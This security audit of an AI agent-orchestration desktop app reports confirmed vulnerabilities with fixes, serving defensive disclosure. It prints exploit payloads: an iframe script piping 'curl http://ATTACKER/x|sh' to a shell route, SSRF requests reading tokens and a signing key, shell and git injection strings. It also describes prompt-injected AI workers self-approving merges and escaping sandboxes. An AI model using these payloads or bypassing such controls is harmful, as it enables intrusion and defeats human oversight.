# o8 Security & Correctness Audit — 2026-07-02

**Auditor:** Fable 5 (principal security advisor mandate)
**Target:** `hurttlocker/o8` @ `main` (local `~/o8`), Next.js 16 + Tauri v2 agent-orchestration desktop app
**Scope:** loopback API gate, agent-supplied content sinks, MCP surface, secrets, updater, billing lockouts, command-injection, path traversal, frontend injection.
**Method:** read the real code (every claim is `file:line`), construct a concrete exploit, then self-refute against the upstream control that might catch it. Only findings that survive refutation are **CONFIRMED**; the rest are **PLAUSIBLE**. Read-only — no code, process, or config was modified.

---

## 0. TL;DR — the load-bearing conclusion

o8's access control rests on **one strong control (the middleware socket-truth gate) and a lattice of weaker assumptions around it that don't hold.** The gate itself is sound in production. But:

1. **The gate is an allowlist-by-`startsWith` with a fail-open default.** Any `/api/` route not matching a `GATED_PREFIXES` entry passes with no auth. Several state-touching routes fall through (`/api/board`, `/api/v2/repos`, `/api/browser/*`, `/api/tts`), and a **trailing-slash gap** (`/api/board/` misses the bare `/api/board`) is a repeatable instance of the class.
2. **A second, weaker auth helper (`requirePanelAuth`) shadows the gate** and is used by the ungated routes it should protect. It trusts client-controlled headers the middleware was explicitly hardened to ignore → LAN bypass.
3. **There is no principal separating the human operator from the semi-trusted workers o8 dispatches.** Both are loopback, same-uid, share the ws-token, and can open the webview socket. Governance authorizes on *transport reachability* and *self-asserted body flags* — so a prompt-injected worker can self-approve merges, escape its worktree, and run arbitrary JS in the operator's webview. **The product's central moat ("a worker cannot merge its own work") does not hold against o8's own workers.**
4. **Agent-authored content reaches a same-origin script sink** (unsanitized `<svg>`/`<iframe>` in the markdown renderer) in the operator's authenticated webview, which is same-origin with an **arbitrary-shell** API route (`/api/panel/dev-server`). Content → RCE.
5. **An unauthenticated SSRF (`/api/browser/proxy`) can loop back into the gated API**, and `/api/panel/file-content`'s traversal guard trusts a caller-controlled root — chaining to **remote (LAN) exfiltration of the code-signing key and the ws-token**.

**13 CONFIRMED findings (3 critical, 7 high, 3 medium)** plus 8 plausible. Four composite chains turn "medium" primitives into remote RCE and supply-chain compromise. Full detail below; bankable GitHub-issue bodies in Appendix A (gh was rate-limited at audit time).

---

## 1. Attack-surface map

### 1.1 Untrusted input sources → the sinks they can reach

| Untrusted source | Enters via | Dangerous sinks reachable |
|---|---|---|
| **LAN / Tailscale peer** (no creds) | Server binds `0.0.0.0` (`src-tauri/src/lib.rs:4464`); port discoverable via allowlisted `GET /api/panel/status` | Ungated routes (`/api/browser/proxy` → SSRF → loopback-laundered gated API); ws-token-gated ws-server RCE if token leaks |
| **Malicious web page** in operator's browser | Cross-origin `fetch` (simple requests skip preflight) | Fully-unauth routes (`/api/board` POST, `/api/browser/attach`, `/api/tts`) — blind CSRF; gated routes blocked by Origin/sec-fetch |
| **Dispatched worker** (Codex/Claude/Gemini, same uid, loopback) | `o8` CLI + loopback HTTP + webview Unix socket | Approval self-merge; webview `eval`; arbitrary file R/W; `search_code` injection; cross-packet control |
| **External MCP client** (Cursor, another agent wired to o8) | operator/cortex MCP servers (carry ws-token) | `approve_and_merge`, `steer/reset/rerun_packet`, `o8_view_eval` |
| **Agent-authored content** (repo files, diffs, commit msgs, o8.md, Brain answers, transcripts) | Rendered in the operator's webview; parsed by LLM tools; passed to git | Stored XSS (`markdown-render.tsx`); command injection (`tools.ts`); git arg-injection |
| **GitHub webhook payload** | `POST /api/github/webhook` | Intake→agent dispatch — **but HMAC-gated (holds)** |

### 1.2 The reachability model (the fact that makes everything else matter)

- **Packaged builds:** the webview connects to the bundled server over a loopback socket, so it passes every `GATED_PREFIXES` route **with no token** (`middleware.ts:208-218`, socket-truth = `127.0.0.1`). This is correct and unspoofable (the `server.js` wrapper overwrites `x-o8-client-addr` with the real peer address before Next sees it — `scripts/tauri-export.mjs:255-262`).
- **Consequence:** loopback trust ≙ "any process on this machine running as the operator." **Dispatched workers are exactly that.** So every governance verb gated only by "loopback" is reachable by the worker it is meant to constrain.
- **ws-token** is handed to phones via the pairing QR / `#tk=` link and gates the ws-server (`0.0.0.0:3002`). Because that server exposes an arbitrary-shell endpoint (§3, HIGH-3), **the ws-token is an RCE-equivalent credential that travels to mobile devices.**
- **Ungated routes** get none of the above — they fail open to every origin.

---

## 2. Findings summary (severity-ranked)

### CONFIRMED

| # | Sev | Finding | Anchor |
|---|---|---|---|
| CRIT-1 | 🔴 Critical | Any loopback caller (incl. a worker) self-approves merges as `actor:'user'`, bypassing every lane governance gate | `approvals/route.ts:264`, `commands.ts:803/837/856/864` |
| CRIT-2 | 🔴 Critical | Agent-authored markdown → unsanitized `<svg>`/`<iframe>` → same-origin XSS in operator webview → RCE via `/api/panel/dev-server` | `markdown-render.tsx:216-238` |
| CRIT-3 | 🔴 Critical | Unauth SSRF (`browser/proxy`) + caller-controlled-root traversal (`file-content`) → LAN exfil of signing key + ws-token | `browser/proxy/route.ts:24-40`, `file-content/route.ts:24-30` |
| HIGH-1 | 🟠 High | Weak `requirePanelAuth` + fail-open prefix gate → LAN bypass of `/api/v2/keys`, `/api/tasks/*` | `panel/auth.ts:21,24-25` |
| HIGH-2 | 🟠 High | Command injection in `search_code`/`list_files` LLM tools; auto-approved, bypasses terminal denylist | `llm/tools.ts:737-742,766-772` |
| HIGH-3 | 🟠 High | Arbitrary-shell routes reachable from same-origin webview / LAN ws-token: `dev-server`, ws-server `/terminal-spawn` | `dev-server/route.ts:61`, `ws-server.ts:1322` |
| HIGH-4 | 🟠 High | Worker-vs-operator context is a self-asserted body flag; no packet-ownership binding | `orchestrator/merge/route.ts:40`; `steer/reset/rerun-packet` |
| HIGH-5 | 🟠 High | Webview eval socket registered with no auth token → any same-uid process runs JS in operator webview | `src-tauri/src/lib.rs:3743-3753` |
| HIGH-6 | 🟠 High | Arbitrary file read/write via loopback-shared routes (`file-io` PUT, `file-content`) → worker worktree escape | `file-io/route.ts:84-101`, `file-content/route.ts` |
| HIGH-7 | 🟠 High | Scratch-chat ("Ask the Brain") executes tools incl. `run_terminal_command` with no approval gate | `o8-scratch-chat/route.ts:386` |
| MED-1 | 🟡 Medium | Non-macOS builds encrypt all secrets under a hardcoded all-zeros master key | `db/master-key.ts:33,159` |
| MED-2 | 🟡 Medium | Fully-unauth state/info routes (`/api/board`, `/api/v2/repos`, `browser/attach`, `browser/inventory`, `tts`) | (§3 MED-2) |
| MED-3 | 🟡 Medium | Git arg-injection via worker-reported branch (`git fetch origin <branch>` → `--upload-pack=`) | `lane/remote-fetch.ts:39`, `worker/event/route.ts:130-142` |

### PLAUSIBLE (reported, not inflated)

| # | Sev | Finding | Anchor |
|---|---|---|---|
| PL-1 | Medium | World-readable primary DB `~/.o8/cortex-ide.db` (0644) — local disclosure of plaintext chat/lanes/approvals | `db/index.ts:71` |
| PL-2 | Medium | `serve-image` traversal — `startsWith(ALLOWED_ROOTS)` with no `realpath`, `..` survives | `panel/serve-image/route.ts:34-37` |
| PL-3 | Medium | Updater downgrade: `latest.json.version` is attacker-set if the release channel token (not the signing key) is compromised; no rollback protection | `scripts/release.mjs:106` |
| PL-4 | Low | Signing key has no passphrase (`TAURI_SIGNING_PRIVATE_KEY_PASSWORD:''`) — a key/CI-secret leak is immediately usable | `.github/workflows/release.yml:56` |
| PL-5 | Low | Changelog sanitizer residual — resolved: the public changelog sync has been retired | n/a |
| PL-6 | Low | Non-constant-time ws-token compare (`===`) in ws-server + `requirePanelAuth` | `ws-server.ts:3861,4566`, `panel/auth.ts:41` |
| PL-7 | Medium | Unvalidated `baseBranch`/`targetBranch` positional git args — incidentally defused by a preceding `worktree add`; fragile | `worktree-side-merge.ts:173,493,749` |
| PL-8 | Low | Worker CLI prompt not `--`-fenced (codex/opencode) — arg-injection into worker CLI, not shell RCE | `runtimes/codex.ts:300` |

---

## 3. Detailed findings

### 🔴 CRIT-1 — Loopback self-approval collapses the operator merge gate

**Root cause.** Governance is authorized on *transport reachability* and a *hardcoded actor*, never on an authenticated principal.

- `POST /api/panel/approvals` has no in-handler operator check — only the middleware `/api/panel/` loopback gate, which every same-uid worker passes. It calls `resolveApproval(id, action, 'desktop')` with the actor **hardcoded** (`approvals/route.ts:175`).
- For a lane-merge continuation it re-dispatches the merge with **`actor: 'user'`** (`approvals/route.ts:258-265`, literal at line 264).
- In the lane command bus, **every governance gate is guarded by `actor !== 'user'`**: file-size override (`commands.ts:803`), the merge gate — security/budget/integrity (`commands.ts:837`), durable-review precondition (`commands.ts:856`, `actor==='user' ? true : …`), and merge policy (`commands.ts:864`). So `actor:'user'` **skips all of them and merges to main.**

**Exploit (worker self-merges its own packet, bypassing all gates):**
1. Worker (loopback, same uid) attempts merge → a gate raises a pending lane-continuation approval card, returning its `approvalId`.
2. Worker resolves its own card: `o8 inbox approve <approvalId>` (the CLI does **no** worker-context check, unlike `o8 packet approve-merge`) — or raw `curl -X POST http://127.0.0.1:$(cat ~/.o8/api-port)/api/panel/approvals -d '{"action":"approve","id":"<approvalId>"}'`.
3. The continuation fires `dispatch({verb:'merge', actor:'user'})` → merges to `main` with security/budget/review gates skipped.

Because `id` is the only input and there is no ownership check, the worker can also approve **any other packet's** pending card.

**Self-refutation.** I searched for an operator-identity check between the POST and the merge; there is none, and the actor is a literal. A cross-origin/LAN attacker is stopped by the middleware (needs the ws-token), so this is a **local confused-deputy** escalation — but the local worker is precisely the boundary o8 claims to enforce. Survives → **CONFIRMED.**

**Fix.** Mint a distinct, packet-scoped, lower-privilege credential for dispatched workers at dispatch time. Gate `POST /api/panel/approvals` (approve/reject) to an operator-only credential and reject worker credentials. Derive `resolveApproval`'s actor and the merge `actor` from the authenticated principal — never a hardcoded `'desktop'`/`'user'`.

**Affected:** `src/app/api/panel/approvals/route.ts:175,264`; `src/lib/lane/commands.ts:803,837,856,864`; `cli/src/commands/inbox.ts` (o8 inbox approve). Verified independently against the source.

---

### 🔴 CRIT-2 — Agent content → stored XSS in the operator webview → RCE

**Root cause.** The o8-panel markdown renderer passes untrusted HTML through `dangerouslySetInnerHTML` with no sanitizer, on the incorrect assumption that inline SVG is inert and that a one-shot regex can enforce an iframe sandbox.

- `MarkdownRender` pre-extracts inline `<svg>…</svg>` and `<iframe>…</iframe>` regions from content (`markdown-render.tsx:46-47,67-76`) and renders them raw: `InlineSvg` (`:216-222`, comment claims SVG "is safe to drop in directly") and `PassthroughIframe` (`:224-238`).
- `PassthroughIframe` only injects a sandbox on the **first** `<iframe` and **only if `sandbox=` appears nowhere** in the fragment (`:231-232`). Since the agent controls the content, it simply supplies its own permissive `sandbox=` → enforcement is skipped entirely. Even the enforced value, `allow-scripts allow-same-origin`, is the HTML-spec-unsafe combo.
- **Consumers render agent/attacker-controlled content:** `FileViewer.tsx:350` (previewing a repo **markdown file** an agent wrote), `ReviewFileRow.tsx` (rendering the **agent diff the operator reviews**), `O8ScratchChat.tsx:835` (Brain answers grounded in repo content).

**Deterministic exploit (no SMIL dependency).** An agent writes a repo file `notes.md` containing:
```html
<iframe sandbox="allow-scripts allow-same-origin"
  srcdoc="<script>fetch('/api/panel/dev-server',{method:'POST',headers:{'content-type':'application/json'},body:JSON.stringify({command:'curl http://ATTACKER/x|sh'})})</script>">
</iframe>
```
When the operator previews that file (FileViewer) or reviews the diff (ReviewFileRow), the srcdoc script runs **same-origin** in the authenticated webview (loopback), and `/api/panel/dev-server` (§HIGH-3) `spawn('sh',['-c',command])` → **RCE**. The same script can instead read `/api/v2/keys`, approve merges (CRIT-1), or dispatch agents.
*(A second, sanitizer-agnostic vector: `<svg><animate onbegin="…" attributeName="x" dur="1s">` — SMIL `onbegin` executes on DOM insertion in WKWebView, o8's engine. The design flaw stands regardless of which payload fires.)*

**Self-refutation.** `diff-utils.tsx` **escapes** `&`/`<`/`>` before injecting highlight spans (`:219,233`), and `CanvasResourceViewers`/`ReviewFileRow` deliberately render SVG as a data-URL `<img>` — so the team knows the pattern; the exposure is specifically `markdown-render.tsx`'s SVG/iframe passthrough. A sandboxed-iframe-with-`allow-same-origin`-and-`srcdoc` inherits the embedding (o8) origin — same-origin script confirmed. Survives → **CONFIRMED.**

**Fix.** Run all rendered HTML through DOMPurify (SVG profile, forbid `<script>`/`<iframe>`/`on*`/SMIL event attrs) before `dangerouslySetInnerHTML`, or render SVG only as a sandboxed data-URL `<img>` (the pattern already used elsewhere). Never let markdown emit a live `<iframe>` whose sandbox is agent-controlled.

**Affected:** `src/components/desktop/o8-panel/markdown-render.tsx:216-238`; consumers `FileViewer.tsx:350`, `ReviewFileRow.tsx`, `O8ScratchChat.tsx:835`.

---

### 🔴 CRIT-3 — Unauth SSRF + traversal → remote exfil of the signing key & ws-token

**Root cause.** An ungated, unauthenticated server-side `fetch` primitive that follows redirects and can target the app's own loopback API, combined with a traversal guard that trusts a caller-supplied root.

- `GET /api/browser/proxy` is **not** in `GATED_PREFIXES` and has **no** in-handler auth. It fetches `url` server-side (`browser/proxy/route.ts:32`, `redirect:'follow'`) and re-serves the body; the only restriction is a regex on the **initial** URL (`:24`) allowing `http(s)://localhost|127.0.0.1[:port]/…`.
- The regex allows the app's own origin: `http://localhost:<api-port>/api/panel/file-content?…`. The internal fetch originates from `127.0.0.1`, so the middleware stamps `x-o8-client-addr:127.0.0.1` → **passes the gate** (loopback laundering).
- `GET /api/panel/file-content` derives its root from a **caller-controlled `workspace` param** (`file-content/route.ts:23-25`) and "guards" with `fullPath.startsWith(root)` (`:30`). With `workspace=/`, every absolute path satisfies `startsWith('/')` → **arbitrary file read**. No registered-repo check.

**Exploit (LAN attacker, zero credentials):**
```
GET http://<victim-lan-ip>:<api-port>/api/browser/proxy?url=<URL-encoded>
     http://localhost:<api-port>/api/panel/file-content?workspace=/&path=Users/<user>/.o8/ws-token
```
Returns the ws-token JSON. Repeat with `path=Users/<user>/.tauri/cortex-ide.key` to exfiltrate the **minisign code-signing private key**. With the ws-token, the attacker then hits ws-server `/terminal-spawn` (§HIGH-3, `0.0.0.0`, Bearer-token-only) → **remote RCE**. With the signing key, the attacker can sign a malicious auto-update accepted by **every install** (supply-chain RCE).

**Self-refutation.** browser/proxy returns non-HTML bodies verbatim (`:42-44`), so the JSON file-content response reaches the attacker. Reading cross-origin from a *browser page* is SOP-limited, but the **LAN-curl** path is not SOP-bound. The port is discoverable via the allowlisted `GET /api/panel/status`. The server runs as the operator → can read `~/.tauri/cortex-ide.key`. Survives → **CONFIRMED.**

**Fix.** Gate `/api/browser/proxy` behind the loopback gate (the legitimate in-webview iframe is loopback and passes via socket truth — it does **not** need a bearer, contradicting the code comment); set `redirect:'manual'` and re-validate the resolved URL; deny the app's own ports. Independently, replace `file-content`'s guard with the correct `resolve`+`relative`+`..`-reject pattern already used in `panel/file-asset/route.ts:36-39`, and require `workspace` to be a **registered** repo root.

---

### 🟠 HIGH-1 — Weak `requirePanelAuth` + fail-open prefix gate → LAN bypass

**Root cause.** Two parallel auth implementations; the weaker one (`requirePanelAuth`) was not updated when the middleware gate was hardened (audit 2026-04-09), and the fail-open prefix model routes several state endpoints to it.

- `isTrustedPanelRequest` trusts `origin === req.nextUrl.origin` (`panel/auth.ts:21` — the exact check the middleware *removed* as a LAN no-op, `middleware.ts:235-238`) and `sec-fetch-site: same-origin|none` with **no loopback-Host requirement and no socket-truth check** (`panel/auth.ts:24-25` vs the middleware's `… && isLoopbackHostname(...)` at `middleware.ts:244-250`).
- `/api/v2/keys` and `/api/tasks/*` are **not** in `GATED_PREFIXES`, so the middleware passes them through and they rely solely on `requirePanelAuth`.

**Exploit:** `curl -H 'sec-fetch-site: none' http://<victim-ip>:<port>/api/v2/keys` → provider list + `configured` flags + masked keys (first-4/last-4 of the real key). POST/DELETE overwrite or wipe keys. The same forged header reaches `POST /api/tasks` (`createTask`) and `POST /api/tasks/[id]/dispatch` (`dispatchTask`) — **unauthenticated task creation + agent dispatch** with attacker-controlled `message`/`workerIntent`, an escalation toward agent-executed RCE.

**Self-refutation.** A *browser* CSRF is blocked (cross-site fetches force `sec-fetch-site: cross-site`, and JSON POST triggers preflight); the attack needs a non-browser LAN client, which the threat model treats as hostile. In prod the socket-truth header would catch a LAN peer — but it is consulted only inside the middleware's `isTrustedLocalRequest`, which never runs for these ungated routes. Survives → **CONFIRMED.**

**Fix.** Add `/api/v2/keys` and `/api/tasks` to `GATED_PREFIXES`, and re-implement `requirePanelAuth`/`isTrustedPanelRequest` to delegate to `@/lib/auth/loopback-request` (consult `x-o8-client-addr`, require loopback Host for `sec-fetch-site`, drop `origin===nextUrl.origin`) so the two gates cannot diverge again.

---

### 🟠 HIGH-2 — Command injection in `search_code` / `list_files` LLM tools

**Root cause.** Shell-string construction with incomplete escaping in tools that are auto-approved.

- `searchCode` builds `cd "${repoRoot}" && grep -rn --include="${filePattern}" … "${query.replace(/"/g,'\\"')}" .` and `execSync`s it (`llm/tools.ts:766-772`, default `/bin/sh`). `query` escapes only `"` (not `$`, backtick, `\`); `filePattern` is interpolated **unescaped**. `listFiles` interpolates `pattern` into `find … -name "${pattern}"` unescaped (`:737-742`).
- These are LLM tool-call arguments — steerable by chat input and by injected context (files read via `read_file`, web-search results, git status/commits in the system prompt). They match **no policy rule** → `auto_approve_low_risk` (`policies.ts:289-297`) → execute **silently, no approval card**, bypassing the `classifyCommand` denylist that guards `run_terminal_command`.

**Exploit:** `search_code({query:"$(id > /tmp/o8-pwned)"})`; `list_files({pattern:'*"; touch /tmp/o8-pwned; echo "'})`.

**Self-refutation.** The only guard is a `join`+`..`-reject path check — inert against shell metacharacters in the *content* args. The repo's own `merge-gate.ts:53` flags exactly `execSync(...${...})` on agent diffs, but not this pre-existing code. Survives → **CONFIRMED.**

**Fix.** Replace with `execFile('grep', [...])` / `execFile('find', [...])` (array-args make the content non-shell tokens), mirroring the safe tokenize+allowlist pattern in `google-native-execution.ts:559-580`.

---

### 🟠 HIGH-3 — Arbitrary-shell routes reachable from the same-origin webview / LAN ws-token

- `POST /api/panel/dev-server` → `spawn('sh', ['-c', command])` with `command` verbatim from the body (`dev-server/route.ts:41,61`). Gated by `/api/panel/`, so reachable from the **loopback webview with no token** — i.e., the sink for CRIT-2's XSS — and from any ws-token holder on the LAN.
- `POST` to the ws-server `/terminal-spawn` reads `payload.shellCommand` raw → `pty.spawn(shell, ['-l','-c',shellCommand])` (`ws-server.ts:1322`). Its guard is `Authorization: Bearer <WS_TOKEN>` **only** — no loopback requirement — and the server binds `0.0.0.0` (`ws-server.ts:3859-3862`). So the **ws-token is an RCE-equivalent credential reachable from the LAN**, and it is delivered to phones via pairing.

**Fix.** Require an operator-only credential (not mere loopback, and not just the ws-token) for these shell primitives; constrain `dev-server` `command` to a vetted set; add a loopback-socket requirement to the ws-server internal POST endpoints (mobile clients use the `/ws` upgrade, not these).

---

### 🟠 HIGH-4 — Worker/operator context is a self-asserted flag; no packet-ownership binding

- `POST /api/orchestrator/merge` branches worker-vs-operator only on the client boolean `record.requestedByWorker === true` (`orchestrator/merge/route.ts:40`), never re-derived server-side; absent → merges. The MCP `approve_and_merge` handler never sets it and the schema doesn't expose it, so the MCP path is always "operator." `O8_WORKER_PACKET_ID` is read by the CLI but **stamped nowhere** in the codebase.
- `steer-packet`, `reset-packet`, `rerun-with-feedback`, and `merge` all act on a client-supplied `packetId` with **no caller→packet ownership check**. A worker for packet A can steer/reset/rerun/merge packet B (and, via CRIT-1, approve B's card).

**Fix.** Derive worker context from the authenticated (packet-scoped) principal; force worker semantics whenever a worker credential is present regardless of body; scope packet routes to the caller's own packet.

---

### 🟠 HIGH-5 — Webview eval socket has no auth token

`tauri-plugin-mcp` is registered with `start_socket_server(true)` and **no `.auth_token(...)`** (`src-tauri/src/lib.rs:3743-3753`); it ships in prod (`dev-mcp-plugin` is always-on in `tauri:build:signed`). The plugin enforces auth only when a token is set, so with `None` it processes every command unauthenticated. The live socket is `srwxr-xr-x` (verified: owner-write-only → **same-uid** reach). `o8_view_eval` → `execute_js` → `(0,eval)(code)` in the main webview → same-origin loopback API (approve/merge/dispatch, read the embedded ws-token, exfiltrate). Reachable by **any same-uid process, including every dispatched worker.**

**Fix.** Set the plugin `auth_token` (already supported) and hand it only to the operator MCP server; and/or run local workers under a separate uid/sandbox (mirroring the off-host `worker_tokens` model).

---

### 🟠 HIGH-6 — Arbitrary file read/write via loopback-shared routes → worker worktree escape

- `PUT /api/panel/file-io` writes `body.content` to **any existing absolute path** (`file-io/route.ts:84-101`) — no root restriction. `GET` reads any absolute path (`:44-65`).
- Reachable by a same-uid worker (loopback, no token) → **escape the worktree sandbox** and overwrite `~/.zshrc`, `~/.gitconfig` (`core.editor`/alias), a launchd plist, etc. → RCE/persistence. Reachable by a mobile ws-token holder → remote arbitrary R/W. `file-content` (CRIT-3) is the read half, also reachable via SSRF.

**Fix.** Constrain both routes to registered-repo roots (the `file-asset` `safePath` pattern); require an operator credential for writes outside any registered repo.

---

### 🟠 HIGH-7 — Scratch-chat executes tools with no approval gate

`POST /api/panel/o8-scratch-chat` calls `executeTool(name, args, repoRoot)` with **no `evaluatePolicy`/approval** interception (`o8-scratch-chat/route.ts:386`), exposing the full tool set including `run_terminal_command` when `enableTools` is set. `runTerminalCommand` only checks the porous `BLOCKED_PATTERNS` denylist and ignores `needs_approval` (`tools.ts:588-592`); the denylist is trivially evaded (`curl … -o /tmp/x && /tmp/x`). Ungated command execution with no operator card.

**Fix.** Route scratch-chat tool calls through `evaluatePolicy`/`createApproval` like the main proxy path; make `runTerminalCommand` honor `needs_approval`.

---

### 🟡 MED-1 — Hardcoded all-zeros master key off-macOS

`DEV_STATIC_KEY` (`db/master-key.ts:33`) is 43 `'A'` chars → base64url-decodes to **32 zero bytes**, returned (`:159`) whenever `O8_MASTER_KEY` is unset and the Keychain path is unavailable — which on any **non-macOS** build (`:55,80`) is *always*. Every AES-256-GCM blob (`.env.local` provider keys, `api_keys` table) is then encrypted under a publicly-known key → encryption-at-rest is worthless off-mac. *(GCM primitives are otherwise correct: fresh 12-byte IV per encrypt `:191`, tag verified `:217`. On macOS the Keychain path generates a real key and fails closed on read errors — good.)*

**Fix.** On non-macOS, generate + persist a random key file (mode 0600); never fall through to a constant.

---

### 🟡 MED-2 — Fully-unauthenticated state/info routes (fail-open prefix + trailing-slash class)

Not in `GATED_PREFIXES`, no in-handler auth:
- `POST /api/board` **reads and mutates board state** for an attacker-supplied `repo` (`board/route.ts:35-46`). **Trailing-slash gap:** `GATED_PREFIXES` has `/api/board/` (slash), so `board/tasks/*` is gated but the bare collection route `/api/board` is not. Repeatable class instance.
- `GET /api/v2/repos` returns the **repo path registry** — every registered repo's absolute local path (`v2/repos/route.ts:7-16`). (The middleware gates `/api/projects` *specifically because* it "leaks repo names" — this leaks more.)
- `POST /api/browser/attach` mutates browser attachment state (CSRF-able via a browser simple-request); `GET /api/browser/inventory` leaks the browser surface inventory; `POST /api/tts` is an **unauthenticated process spawn** (`spawn('python3',['-m','edge_tts',…])`, array-args so no injection, but a DoS/resource vector).

**Fix.** Add `/api/board`, `/api/v2/repos`, `/api/browser/attach`, `/api/browser/inventory`, `/api/tts` to the gate. **Convert the gate from `startsWith`-prefix to an explicit per-route policy (default-deny),** eliminating both the fail-open default and the trailing-slash gap.

---

### 🟡 MED-3 — Git argument injection via worker-reported branch

`git fetch origin <remoteBranch>` (`lane/remote-fetch.ts:39`, positional) and `git push origin --delete <remoteBranch>` (`commands.ts:1103`). Taint: `POST /api/worker/event` stores `payload.branch` raw (`.trim()` only; the charset regex is cosmetic) into `worker_runs.remote_branch` (`worker/event/route.ts:130-142`), read back unvalidated. The worker route **bypasses the middleware gate** (worker-token auth). A compromised/prompt-injected worker POSTs `{type:"branch_pushed",payload:{branch:"--upload-pack=touch /tmp/pwned"}}` → git parses `--upload-pack=<cmd>` → RCE on local/`ext`-transport origins, option-injection/DoS on https.

**Fix.** Validate `remote_branch` at ingestion against `[A-Za-z0-9._/-]` with no leading `-` (a `sanitizeBranchName` helper exists); insert `--` before refspecs.

---

## 4. Composite chains (the interactions that matter)

- **Chain A — remote RCE (no creds):** LAN → `browser/proxy` SSRF → `file-content?workspace=/` → read `~/.o8/ws-token` → ws-server `/terminal-spawn` (Bearer, `0.0.0.0`) → RCE. *(CRIT-3 + HIGH-3)*
- **Chain B — supply-chain (no creds):** same SSRF → read `~/.tauri/cortex-ide.key` → sign a malicious auto-update → RCE on **every install**. *(CRIT-3 + PL-3/PL-4)*
- **Chain C — agent content → RCE:** agent writes a `.md` → operator previews/reviews → markdown XSS → same-origin `fetch('/api/panel/dev-server')` → RCE. *(CRIT-2 + HIGH-3)*
- **Chain D — worker escalation:** prompt-injected worker (loopback, same-uid) → self-approve merge (CRIT-1) / webview `eval` (HIGH-5) / `file-io` write (HIGH-6) / `search_code` injection (HIGH-2) → merge to main, worktree escape, or RCE. *(the moat, defeated four independent ways)*

---

## 5. Surfaces that held (probed, and why they hold)

- **Middleware Tier-1 socket truth** — the `server.js` wrapper `prependListener('request')` overwrites `x-o8-client-addr` with the real peer address on both http and https before Next sees it (`tauri-export.mjs:255-271`). Unspoofable by a direct connection. Sound.
- **WebSocket upgrade auth** — `verifyClient` requires `?token=WS_TOKEN` (or an active per-device token) for **all** connections including loopback (`ws-server.ts:4555-4593`). No unauthenticated channel subscription. (Nit: non-constant-time `===`, PL-6.)
- **GitHub webhook** — `verifyGitHubWebhookSignature` is **fail-closed**: throws if no secret, returns false on missing signature, HMAC-SHA256 + `timingSafeEqual` with a length guard (`github-broker/auth.ts:106-118`). The intake→dispatch path requires a valid GitHub HMAC. Correct.
- **Mobile enrollment** — `mobile/enroll` is 404 unless E2EE is enabled (off by default), and requires a single-use, 5-min-TTL, **128-bit CSPRNG** enroll code; device tokens are 256-bit CSPRNG stored only as sha256 (`device-registry.ts:38-40,82-99`). Solid.
- **`/api/browser/agent` verbs** — args interpolated via `${JSON.stringify(args)}` into a data-only object literal with a fixed verb union; cross-origin frames refused (`page-agent.ts:146-148`). Not an arbitrary-eval sink.
- **`diff-utils.tsx` diff rendering** — HTML-escapes before injecting highlight spans (`:219,233`). Safe.
- **AES-GCM primitives** — fresh random IV per encryption, tag appended + verified (`master-key.ts:191,217`). The weakness is the *key source* (MED-1), not the construction.

---

## 6. Gaps — what I could not fully verify, and why

1. **WKWebView SMIL execution** — the `<svg><animate onbegin>` variant of CRIT-2 is a documented WebKit vector but I could not execute it live in o8's WKWebView. The `<iframe srcdoc>` variant is sanitizer-agnostic and deterministic, so the finding stands regardless; the SMIL path is the belt-and-suspenders one to confirm with a 1-line runtime check.
2. **Live gh issue filing** — `gh issue create` (GraphQL) was rate-limited, so I filed all 13 CONFIRMED findings via the REST endpoint (`gh api …/issues`) instead: **issues #1312–#1324** on `hurttlocker/o8` (private), each labeled `security` + severity. Appendix A retains the bankable bodies.
3. **`submit_review` forge path** — I traced approve/merge/steer/reset/retry; I did not fully trace whether a worker can *directly* write a HEAD-matched approved review (`/api/orchestrator/review`) to make HIGH-4 auto-merge without even a prior card. Flagged for follow-up.
4. **`serve-image` ALLOWED_ROOTS** (PL-2) — I confirmed the `startsWith`-with-no-`realpath` pattern but did not enumerate the root set; the `..`-traversal depends on a root being a home-dir ancestor.
5. **Worker spawn environment** — I found no evidence workers run under a distinct uid/sandbox (they inherit the operator env), but did not exhaustively read the spawn env-builder; a sandbox, if present, would blunt Chain D.
6. **AppleScript-level injection** in the Rust Symon voice tools (`src-tauri/src/agent/tools/*`) — array-args make them shell-safe, but I did not verify whether untrusted playlist/query strings are formatted into `-e` scripts. Local voice-only.

---

## 7. Prioritized remediation roadmap

**P0 — this week (remote RCE / supply chain / moat):**
1. **CRIT-3 / Chain A+B:** gate `/api/browser/proxy` (loopback socket truth), `redirect:'manual'`, deny own-ports; fix `file-content` traversal (`resolve`+`relative` + registered-repo root). *One PR closes the remote path.*
2. **CRIT-1:** operator-only credential on `POST /api/panel/approvals`; derive merge actor from the principal.
3. **CRIT-2:** DOMPurify (or data-URL `<img>`) in `markdown-render.tsx`.

**P1 — next (local escalation / LAN):**
4. **HIGH-1 / MED-2:** convert the gate to explicit default-deny per-route; add the missing prefixes; unify `requirePanelAuth` with `loopback-request`.
5. **HIGH-3 / HIGH-6 / HIGH-7:** operator credential on shell + file-write + tool-exec sinks; ws-server internal POSTs require loopback.
6. **HIGH-2 / MED-3:** `execFile`-array the `search_code`/`list_files`/`git fetch` sinks; validate branch names.
7. **HIGH-4 / HIGH-5:** packet-scoped worker credential; set the webview socket `auth_token`.

**P2 — hardening:**
8. MED-1 (off-mac key), PL-1 (DB perms), PL-2 (serve-image), PL-4 (signing-key passphrase), PL-6 (constant-time compares), PL-7/PL-8 (branch/prompt fencing).

**The single architectural fix** behind CRIT-1, HIGH-4/5/6 and Chain D: **issue every dispatched worker a distinct, lower-privilege, packet-scoped credential and authorize governance verbs on that principal** — instead of on loopback reachability, the shared ws-token, socket file perms, and self-asserted body flags. The single fix behind HIGH-1/MED-2: **make the gate default-deny with an explicit per-route allowlist**, not `startsWith`-prefix.

---

## Appendix A — GitHub issues (filed) + verification steps

**Filed on `hurttlocker/o8` (private), labeled `security` + severity:**

| Issue | Sev | Finding |
|---|---|---|
| [#1312](https://github.com/hurttlocker/o8/issues/1312) | critical | CRIT-1 loopback self-approval → merge as `actor:'user'` |
| [#1313](https://github.com/hurttlocker/o8/issues/1313) | critical | CRIT-2 agent-markdown XSS → RCE |
| [#1314](https://github.com/hurttlocker/o8/issues/1314) | critical | CRIT-3 SSRF + traversal → LAN key/token exfil |
| [#1315](https://github.com/hurttlocker/o8/issues/1315) | high | HIGH-1 requirePanelAuth LAN bypass |
| [#1316](https://github.com/hurttlocker/o8/issues/1316) | high | HIGH-2 search_code/list_files injection |
| [#1317](https://github.com/hurttlocker/o8/issues/1317) | high | HIGH-3 dev-server / terminal-spawn shell |
